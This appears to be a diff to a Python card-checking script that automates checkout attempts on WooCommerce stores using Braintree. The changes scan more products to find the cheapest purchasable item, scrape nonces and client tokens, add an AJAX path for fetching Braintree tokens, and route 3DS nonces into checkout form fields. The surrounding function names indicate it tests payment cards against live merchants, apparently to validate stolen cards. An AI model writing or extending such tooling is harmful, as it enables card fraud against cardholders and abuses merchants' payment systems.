@@ -115,9 +115,11 @@ def _classify(response_text: str, http_status: int, amount: str, card_str: str) 
 def _discover_product(session: requests.Session, domain: str, ua: str):
     """Return cheapest product_id string, or None if nothing found."""
     # Try WooCommerce Store REST API with price sort first
+    # Use per_page=100 so we scan enough items to find a purchasable one (some stores
+    # list many non-purchasable/out-of-stock products at the front of the price-sorted list)
     for api_url in (
-        f"https://{domain}/wp-json/wc/store/v1/products?per_page=10&orderby=price&order=asc&status=publish",
-        f"https://{domain}/wp-json/wc/store/v1/products?per_page=10&orderby=price&order=asc",
+        f"https://{domain}/wp-json/wc/store/v1/products?per_page=100&orderby=price&order=asc&status=publish",
+        f"https://{domain}/wp-json/wc/store/v1/products?per_page=100&orderby=price&order=asc",
     ):
         try:
             r = session.get(api_url, headers={"User-Agent": ua}, timeout=REQUEST_TIMEOUT)
@@ -208,9 +210,9 @@ def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple
                 nonce = m.group(1)
 
         # ── Braintree clientToken — detect plugin type ────────────────────
-        # SkyVerge/GoDaddy WC Braintree: var wc_braintree_client_token = ["<base64>"]
+        # SkyVerge v2 WC Braintree: var wc_braintree_client_token = ["<base64>"]
         client_token = ""
-        plugin_type = "native"
+        plugin_type = "native_ajax"
         m = re.search(r'var wc_braintree_client_token\s*=\s*(\[.+?\]);', html)
         if m:
             try:
@@ -221,7 +223,7 @@ def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple
             except Exception:
                 pass
 
-        # Native WooCommerce Braintree plugin patterns
+        # Native WooCommerce Braintree plugin — inline patterns
         if not client_token:
             for pat in (
                 r'"clientToken"\s*:\s*"([A-Za-z0-9+/=]{40,})"',
@@ -231,8 +233,40 @@ def _get_checkout_data(session: requests.Session, domain: str, ua: str) -> tuple
                 m = re.search(pat, html)
                 if m:
                     client_token = m.group(1)
-                    plugin_type = "native"
+                    plugin_type = "native_inline"
                     break
+
+        # SkyVerge v1 / native WC Braintree — token loaded via AJAX on page load
+        # Detected by presence of WC_Braintree_Credit_Card_Payment_Form_Handler with
+        # client_token_nonce but no inline token
+        if not client_token:
+            ct_nonce_m = re.search(
+                r'(?:WC_Braintree_Credit_Card_Payment_Form_Handler|wc_braintree_credit_card_handler)'
+                r'[^}]{0,500}"client_token_nonce"\s*:\s*"([^"]+)"',
+                html, re.S,
+            )
+            if not ct_nonce_m:
+                ct_nonce_m = re.search(r'"client_token_nonce"\s*:\s*"([^"]+)"', html)
+            if ct_nonce_m:
+                ct_nonce = ct_nonce_m.group(1)
+                try:
+                    rt = session.get(
+                        f"https://{domain}/?wc-ajax=wc_braintree_credit_card_get_client_token",
+                        params={"nonce": ct_nonce},
+                        headers={"User-Agent": ua, "X-Requested-With": "XMLHttpRequest"},
+                        timeout=REQUEST_TIMEOUT,
+                    )
+                    body = rt.text.strip()
+                    if body:
+                        # Response may be plain base64 or JSON-encoded string
+                        try:
+                            decoded_body = json.loads(body)
+                            client_token = decoded_body if isinstance(decoded_body, str) else ""
+                        except Exception:
+                            client_token = body
+                        plugin_type = "native_ajax"
+                except Exception:
+                    pass
 
         # ── Grand total from checkout page ────────────────────────────────
         amount = ""
@@ -445,10 +479,10 @@ def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwa
             )
             if got:
                 if plugin_type == "skyverge":
-                    # SkyVerge: original token stays in main field, 3DS nonce is separate
+                    # SkyVerge: original token stays in main nonce field, 3DS nonce is separate
                     threeds_nonce = got
                 else:
-                    # Native WooCommerce Braintree: 3DS nonce replaces the payment nonce
+                    # Native WC Braintree (inline or AJAX): 3DS nonce replaces the payment nonce
                     nonce_payment = got
     except Exception:
         pass  # non-fatal
@@ -460,8 +494,8 @@ def check_b3woo(session: requests.Session, domain: str, card_tuple: tuple, **kwa
     })
 
     # Build checkout fields based on Braintree plugin type
-    if plugin_type == "skyverge":
-        # SkyVerge / GoDaddy WC Braintree plugin field names
+    if plugin_type in ("skyverge", "native_ajax"):
+        # SkyVerge field names (both v2 inline and v1 AJAX-loaded token)
         checkout_data = {
             "billing_first_name":                 ident["fname"],
             "billing_last_name":                  ident["lname"],
